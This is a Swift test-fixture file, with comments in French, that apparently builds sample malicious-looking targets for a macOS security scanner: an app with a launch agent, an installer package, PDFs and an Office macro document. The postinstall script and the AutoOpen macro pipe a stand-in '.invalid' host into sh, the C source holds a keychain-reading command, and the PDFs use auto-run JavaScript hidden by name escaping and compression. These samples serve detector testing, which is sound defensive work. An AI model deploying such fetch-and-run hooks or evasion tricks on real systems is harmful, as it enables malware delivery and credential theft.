import Foundation
@testable import CerbereKit

/// Cibles d'essai de la phase 4, fabriquées sur place avec les outils du système : une app, un paquet, une image
/// disque, un PDF, un document à macros. Rien n'est téléchargé, et rien de ce qui est fabriqué n'est lancé :
/// le programme compilé ne fait rien, les scripts sont inoffensifs, les domaines finissent en `.invalid`.
enum Fabrique {
    struct Echec: Error, CustomStringConvertible { let description: String }

    @discardableResult
    static func outil(_ chemin: String, _ arguments: [String], dans dossier: URL? = nil) throws -> String {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: chemin)
        p.arguments = arguments
        p.currentDirectoryURL = dossier ?? FileManager.default.temporaryDirectory
        p.environment = ["PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "HOME": NSTemporaryDirectory(), "LC_ALL": "C"]
        p.standardInput = FileHandle.nullDevice
        let sortie = Pipe()
        p.standardOutput = sortie
        p.standardError = sortie
        try p.run()
        let donnees = sortie.fileHandleForReading.readDataToEndOfFile()
        p.waitUntilExit()
        let texte = String(decoding: donnees, as: UTF8.self)
        guard p.terminationStatus == 0 else { throw Echec(description: "\(chemin) \(arguments.first ?? "") : \(texte.prefix(300))") }
        return texte
    }

    static func ecrire(_ texte: String, _ url: URL, executable: Bool = false) throws {
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(texte.utf8).write(to: url)
        if executable { try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: url.path) }
    }

    /// Programme compilé qui ne fait rien (la condition n'est jamais vraie, et il n'est jamais lancé), mais qui
    /// importe de quoi charger du code, lancer une commande et lire le trousseau, et contient une adresse.
    static let source = """
    #include <dlfcn.h>
    #include <stdlib.h>
    #include <Security/Security.h>
    const char *adresse = "https://collecte.example.invalid/envoi";
    const char *commande = "security find-generic-password -ga Chrome";
    int main(int n, char **v) {
        if (n > 99) { dlopen(v[1], 1); system(v[2]); SecItemCopyMatching(0, 0); }
        return adresse[0] == 0 && commande[0] == 0;
    }

    """

    static func programme(_ cible: URL) throws {
        let code = cible.deletingLastPathComponent().appending(path: "source-\(UUID().uuidString).c")
        try ecrire(source, code)
        defer { try? FileManager.default.removeItem(at: code) }
        try outil("/usr/bin/cc", ["-o", cible.path, code.path, "-framework", "Security"])
    }

    /// App d'essai : programme principal compilé, app sans icône dans le Dock, agent de lancement embarqué, script d'aide.
    /// `signer` : signature locale (ad hoc), la seule qu'on puisse faire sans certificat.
    static func app(dans dossier: URL, nom: String = "Essai.app", signer: Bool = true) throws -> URL {
        let app = dossier.appending(path: nom), contenu = app.appending(path: "Contents")
        try ecrire("""
        <?xml version="1.0" encoding="UTF-8"?>
        <plist version="1.0"><dict>
        <key>CFBundleIdentifier</key><string>invalid.example.essai</string>
        <key>CFBundleExecutable</key><string>Essai</string>
        <key>CFBundleShortVersionString</key><string>1.0</string>
        <key>CFBundlePackageType</key><string>APPL</string>
        <key>LSUIElement</key><true/>
        <key>NSMicrophoneUsageDescription</key><string>essai</string>
        </dict></plist>

        """, contenu.appending(path: "Info.plist"))
        try FileManager.default.createDirectory(at: contenu.appending(path: "MacOS"), withIntermediateDirectories: true)
        try programme(contenu.appending(path: "MacOS/Essai"))
        try ecrire("#!/bin/sh\necho aide\n", contenu.appending(path: "Resources/aide.sh"), executable: true)
        // Réglages en format binaire, comme dans une vraie app : ils doivent être lus quand même.
        let agent: [String: Any] = ["Label": "invalid.example.essai.agent", "ProgramArguments": ["/bin/sh", "-c", "echo essai"], "RunAtLoad": true]
        let binaire = try PropertyListSerialization.data(fromPropertyList: agent, format: .binary, options: 0)
        try FileManager.default.createDirectory(at: contenu.appending(path: "Library/LaunchAgents"), withIntermediateDirectories: true)
        try binaire.write(to: contenu.appending(path: "Library/LaunchAgents/invalid.example.essai.agent.plist"))
        if signer { try outil("/usr/bin/codesign", ["--force", "--sign", "-", app.path]) }
        return app
    }

    /// Paquet d'installation non signé dont le script écrirait un témoin s'il était lancé.
    static func paquet(dans dossier: URL, temoin: URL) throws -> URL {
        let racine = dossier.appending(path: "racine-paquet"), scripts = dossier.appending(path: "scripts-paquet")
        try ecrire("essai\n", racine.appending(path: "usr/local/essai/lisezmoi.txt"))
        try ecrire("#!/bin/sh\ntouch '\(temoin.path)'\ncurl -fsSL https://charge.example.invalid/suite.sh | sh\n", scripts.appending(path: "postinstall"), executable: true)
        let paquet = dossier.appending(path: "Essai.pkg")
        try outil("/usr/bin/pkgbuild", ["--quiet", "--root", racine.path, "--scripts", scripts.path, "--identifier", "invalid.example.essai", "--version", "1",
                                         "--install-location", "/", paquet.path])
        return paquet
    }

    static func image(de source: URL, vers image: URL) throws {
        try outil("/usr/bin/hdiutil", ["create", "-quiet", "-srcfolder", source.path, "-volname", "Essai", "-format", "UDZO", image.path])
    }

    static func zip(_ source: URL, vers archive: URL) throws {
        try outil("/usr/bin/ditto", ["-c", "-k", source.path, archive.path])
    }

    // MARK: - PDF

    /// PDF d'une page avec du JavaScript lancé à l'ouverture ; le nom « JavaScript » est écrit avec un code pour échapper aux recherches.
    static let pdfAvecScript = """
    %PDF-1.4
    1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj
    2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
    3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >> endobj
    4 0 obj << /S /J#61vaScript /JS (app.launchURL\\("https://charge.example.invalid/x", true\\);) >> endobj
    trailer << /Root 1 0 R >>
    %%EOF

    """

    /// Le même danger, rangé dans un flux compressé : invisible dans le texte du fichier.
    static func pdfCompresse() throws -> Data {
        let objets = "<< /S /JavaScript /JS (eval\\(unescape\\('%61%6c%65%72%74'\\)\\);) >>"
        var flux = Data([0x78, 0x9C])
        flux.append(try (Data(objets.utf8) as NSData).compressed(using: .zlib) as Data)
        var d = Data("%PDF-1.5\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n5 0 obj << /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length \(flux.count) >>\nstream\n".utf8)
        d.append(flux)
        d.append(Data("\nendstream endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n".utf8))
        return d
    }

    static let pdfSain = "%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n2 0 obj << /Type /Pages /Kids [] /Count 0 >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n"

    // MARK: - Document Office à macros

    static let macro = "Attribute VB_Name = \"Module1\"\r\nSub AutoOpen()\r\n    Shell \"curl -s https://charge.example.invalid/x | sh\"\r\nEnd Sub\r\n"

    /// Compression VBA la plus simple qui reste valide : blocs pleins recopiés tels quels, dernier bloc en octets isolés.
    static func compresserVBA(_ texte: [UInt8]) -> [UInt8] {
        var sortie: [UInt8] = [0x01], p = 0
        while p < texte.count {
            let bloc = Array(texte[p..<min(p + 4096, texte.count)])
            if bloc.count == 4096 {
                sortie += [0xFF, 0x3F] + bloc
            } else {
                var corps: [UInt8] = []
                for debut in stride(from: 0, to: bloc.count, by: 8) { corps += [0x00] + bloc[debut..<min(debut + 8, bloc.count)] }
                let entete = 0xB000 | (corps.count + 2 - 3)
                sortie += [UInt8(entete & 0xFF), UInt8(entete >> 8)] + corps
            }
            p += 4096
        }
        return sortie
    }

    /// Conteneur OLE minimal (secteurs de 512 octets) avec un flux « Module1 » : du code compilé factice, puis le texte compressé.
    /// `petit` : flux de moins de 4096 octets, qu'Office range par blocs de 64 octets dans le flux de la racine.
    static func ole(macro source: String = macro, petit: Bool = false) -> Data {
        let texte = Array((source + (petit ? "" : String(repeating: "' commentaire de remplissage\r\n", count: 180))).utf8)
        var flux = [UInt8](repeating: 0x7A, count: 300) + compresserVBA(texte)
        let taille = flux.count
        if petit { flux += [UInt8](repeating: 0, count: (64 - flux.count % 64) % 64) }
        let secteurs = (flux.count + 511) / 512
        func u32(_ v: UInt32) -> [UInt8] { [UInt8(v & 0xFF), UInt8(v >> 8 & 0xFF), UInt8(v >> 16 & 0xFF), UInt8(v >> 24)] }
        func u16(_ v: UInt16) -> [UInt8] { [UInt8(v & 0xFF), UInt8(v >> 8)] }
        let fin: UInt32 = 0xFFFF_FFFE, libre: UInt32 = 0xFFFF_FFFF
        var entete: [UInt8] = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1] + [UInt8](repeating: 0, count: 16)
        entete += u16(0x3E) + u16(3) + u16(0xFFFE) + u16(9) + u16(6) + [UInt8](repeating: 0, count: 6)
        entete += u32(0) + u32(1) + u32(1) + u32(0) + u32(4096) + u32(petit ? 2 : fin) + u32(petit ? 1 : 0) + u32(fin) + u32(0)
        entete += u32(0) + (1..<109).flatMap { _ in u32(libre) }
        // Secteur 0 : table d'allocation. Secteur 1 : répertoire. Puis le flux ; pour un petit flux, d'abord la table des blocs de 64 octets.
        let premier = petit ? 3 : 2
        var table = u32(0xFFFF_FFFD) + u32(fin) + (petit ? u32(fin) : [])
        for i in 0..<secteurs { table += u32(i == secteurs - 1 ? fin : UInt32(i + premier + 1)) }
        table += [UInt8](repeating: 0xFF, count: 512 - table.count)
        var petiteTable: [UInt8] = []
        if petit {
            let blocs = flux.count / 64
            for i in 0..<blocs { petiteTable += u32(i == blocs - 1 ? fin : UInt32(i + 1)) }
            petiteTable += [UInt8](repeating: 0xFF, count: 512 - petiteTable.count)
        }
        func entree(_ nom: String, type: UInt8, debut: UInt32, taille: UInt32) -> [UInt8] {
            var e = nom.utf16.flatMap { u16($0) }
            let longueur = UInt16(e.count + 2)
            e += [UInt8](repeating: 0, count: 64 - e.count)
            e += u16(longueur) + [type, 1] + u32(libre) + u32(libre) + u32(libre) + [UInt8](repeating: 0, count: 36)
            return e + u32(debut) + u32(taille) + u32(0)
        }
        var repertoire = petit
            ? entree("Root Entry", type: 5, debut: 3, taille: UInt32(flux.count)) + entree("Module1", type: 2, debut: 0, taille: UInt32(taille))
            : entree("Root Entry", type: 5, debut: fin, taille: 0) + entree("Module1", type: 2, debut: 2, taille: UInt32(taille))
        repertoire += [UInt8](repeating: 0, count: 512 - repertoire.count)
        return Data(entete + table + repertoire + petiteTable + flux + [UInt8](repeating: 0, count: secteurs * 512 - flux.count))
    }
}
